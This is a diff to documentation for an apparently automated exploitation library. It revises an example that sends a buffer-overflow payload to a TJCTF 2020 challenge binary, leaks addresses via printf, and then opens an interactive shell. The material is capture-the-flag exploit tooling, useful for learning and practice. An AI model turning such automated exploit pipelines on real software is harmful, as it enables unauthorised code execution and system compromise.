@@ -62,29 +62,20 @@ See how the below example neatly manages to "downgrade" the problem from somethi
     BIN = "./tests/tjctf_2020/stop"
 
 
-    def send_letter_first(t, data):
+    def send_letter_first(tube, data):
         # the binary expects us to choose a letter first, before it takes input unsafely
-        t.sendline("A")
-        # avoid messing up output by cleaning it of whatever "A" did
-        t.clean(constants.CLEAN_TIME)
+        tube.sendline("A")
         # send actual payload
-        t.sendline(data)
-        # clean output so generic output gets out of the way
-        t.recvuntil(b"Sorry, we don't have that category yet\n")
-
-
-    # in this case a function is overkill,
-    # but demonstrates the flexibility of custom pipelines
-    def set_overwriter(state):
-        state.overwriter = send_letter_first
-        return state
-
+        tube.sendline(data)
 
     # create a starting state
     s = PwnState(BIN, lambda: process(BIN))
+    # set an overwriter function, if the buffer overflow input
+    # is not available immediately
+    s.overwriter = send_letter_first
 
-    # build a custom pipeline - base classic pipeline, with printf for leaking
-    pipeline = Pipeline(set_overwriter, turnkey.classic(leak=leak.printf))
+    # use base classic pipeline, with printf for leaking
+    pipeline = turnkey.classic(leak=leak.printf)
     result = pipeline(s)
 
     # switch to interactive shell which we got via the exploit
